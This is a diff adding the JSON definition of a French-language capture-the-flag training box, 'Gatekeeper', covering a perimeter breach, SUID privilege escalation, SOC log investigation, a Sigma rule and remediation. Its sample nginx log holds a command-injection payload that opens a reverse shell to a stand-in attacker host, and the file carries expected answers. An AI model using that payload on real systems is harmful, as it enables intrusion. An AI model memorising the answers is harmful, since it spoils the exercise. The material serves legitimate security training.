@@ -1,0 +1,98 @@
+{
+  "id": "aegis-box-01-perimeter",
+  "title": "Gatekeeper // Périmètre Externe",
+  "organization": "Aegis Defense Systems",
+  "category": "campaign",
+  "act": 1,
+  "season": 1,
+  "target_os": "Linux",
+  "machine_type": "box",
+  "difficulty": "medium",
+  "points": 200,
+  "duration_min": 60,
+  "learning_path": "campaign-season-1",
+  "author": "Aegis RedOps & Elena Vance",
+  "tags": [
+    "campaign-season-1",
+    "perimeter-breach",
+    "suid-privesc",
+    "soc-investigation",
+    "sigma-detection",
+    "remediation"
+  ],
+  "mitre_tags": [
+    "T1595 - Active Scanning",
+    "T1190 - Exploit Public-Facing Application",
+    "T1068 - Exploitation for Privilege Escalation",
+    "T1078 - Valid Accounts"
+  ],
+  "owasp_tags": [
+    "A01:2021-Broken Access Control",
+    "A03:2021-Injection"
+  ],
+  "cve": "CVE-2026-AEGIS-01",
+  "rating": 5.0,
+  "solves": 412,
+  "monogram": "GTK",
+  "mission_order": "ORDRE DE MISSION N° 2026-088 // CONFIDENTIEL DÉFENSE\nÉmetteur : Elena Vance, CISO, Aegis Defense Systems\nDestinataire : Cellule d'Évaluation Tactique (Opérateur)\nObjet : Audit d'intrusion périmétrique et investigation sur anomalies de télémétrie.\n\nDans le cadre de l'audit de cyber-résilience d'Aegis Defense Systems, vous êtes mandaté pour évaluer notre passerelle externe DMZ 'Gatekeeper' (10.10.10.50). Nos sondes d'alerte ont relevé des anomalies nocturnes : des paquets suspects laissent présager une tentative d'implantation par un tiers hostile (Chimera APT Group).\n\nVotre objectif : identifier le point d'entrée, obtenir l'accès opérateur (User Flag), élever vos privilèges en root (Root Flag), extraire les artefacts laissés par l'adversaire, puis basculer en mode Blue Team pour investiguer les logs SOC, valider la règle Sigma et patcher la vulnérabilité.",
+  "rules_of_engagement": "RÈGLES D'ENGAGEMENT (RoE) :\n1. Périmètre strict : Système 10.10.10.50 (gatekeeper.aegis-defense.net).\n2. Ports autorisés : 80, 443, 8080, 2222.\n3. Interdiction de toute attaque par déni de service (DoS/DDoS).\n4. Tous les artefacts et traces trouvés doivent être conservés pour l'Acte II.\n5. Remédiation obligatoire en fin de mission sous contrôle du RSSI.",
+  "prerequisites": [
+    "Méthodologie d'énumération HTTP et analyse d'API",
+    "Maîtrise de l'escalade de privilèges Linux (SUID & GTFOBins)",
+    "Bases d'analyse de logs Nginx / syslog et règles de détection Sigma"
+  ],
+  "recommended_tools": [
+    "Nmap / Rustscan",
+    "curl / Burp Suite",
+    "find / GTFOBins",
+    "Wireshark / tshark",
+    "Sigma Rule Engine"
+  ],
+  "narrative_story": "Aegis Defense Systems opère la passerelle de télémétrie DMZ 'Gatekeeper'. Lors d'une mise à jour de micro-services, une API interne de diagnostic a été exposée sans validation des entrées. Un opérateur inconnu affilié au groupe Chimera a déjà tenté d'y déposer un implant persistant. Votre mission commence sur le périmètre externe.",
+  "target_port": 8080,
+  "virtual_ip": "10.10.10.50",
+  "artifacts_discovered": [
+    {
+      "name": "chimera_beacon.pcap",
+      "type": "pcap",
+      "description": "Capture réseau d'une balise HTTP chiffrée émise par l'opérateur Chimera Viktor K. vers l'interne.",
+      "path": "/home/operator/chimera_beacon.pcap"
+    },
+    {
+      "name": "gatekeeper_config.json",
+      "type": "json",
+      "description": "Fichier de configuration interne révélant l'adresse du serveur Core Nexus (10.10.10.60).",
+      "path": "/home/operator/gatekeeper_config.json"
+    }
+  ],
+  "debrief_json": {
+    "storyline": "L'audit a permis de découvrir que le groupe hostile Chimera APT avait exploité une injection dans le portail Gatekeeper et configuré le binaire /usr/local/bin/aegis-sync avec le bit SUID pour maintenir une persistance discrète.",
+    "key_lesson": "Un binaire propriétaire exécuté avec les privilèges root (SUID 4755) ne doit jamais faire appel à des commandes externes sans sanitisation intégrale du PATH et des variables d'environnement.",
+    "historical_case": "Exploitation de passerelles Citrix ADC / NetScaler (CVE-2019-19781 & CVE-2023-3519) par des cybercriminels et groupes APT étatiques pour établir une tête de pont persistante dans des réseaux de défense.",
+    "permanent_remediation": "1. Retirer le bit SUID sur les exécutables non standard : chmod 0755 /usr/local/bin/aegis-sync.\n2. Mettre en œuvre une politique AppArmor/SELinux interdisant la création de processus shells interactifs depuis la passerelle web.\n3. Activer la journalisation centralisée des commandes root via auditd avec corrélation SIEM immédiate."
+  },
+  "defense_tasks": {
+    "soc_investigation": {
+      "question": "Quelle est l'adresse IP source utilisée par l'attaquant Chimera identifiée dans /var/log/nginx/access.log ?",
+      "expected_answer": "198.51.100.42",
+      "log_file": "/var/log/nginx/access.log",
+      "sample_logs": "198.51.100.42 - - [27/Oct/2026:03:14:22 +0000] \"POST /portal/api/exchange HTTP/1.1\" 200 412 \"curl/8.2.1\" \"PAYLOAD:';/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1;'\"\n198.51.100.42 - - [27/Oct/2026:03:15:01 +0000] \"GET /portal/api/status HTTP/1.1\" 200 89 \"-\" \"Chimera-Scanner/1.0\""
+    },
+    "detection_rule": {
+      "type": "sigma",
+      "title": "Détection d'abus SUID aegis-sync",
+      "expected_pattern": "aegis-sync",
+      "starter_template": "title: Abus de Binaire SUID aegis-sync\nstatus: experimental\ndescription: Détecte l'exécution anormale du binaire de synchronisation avec privilèges root\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith:\n      - '/usr/local/bin/aegis-sync'\n      - 'aegis-sync'\n  condition: selection"
+    },
+    "remediation": {
+      "type": "strip_suid",
+      "target_file": "/usr/local/bin/aegis-sync",
+      "expected_mode": "0755",
+      "actions_required": [
+        "Vérifier les permissions actuelles : ls -la /usr/local/bin/aegis-sync",
+        "Retirer le bit SUID : chmod 0755 /usr/local/bin/aegis-sync",
+        "Confirmer la suppression du bit SUID (-rwxr-xr-x) avant de valider"
+      ]
+    }
+  }
+}
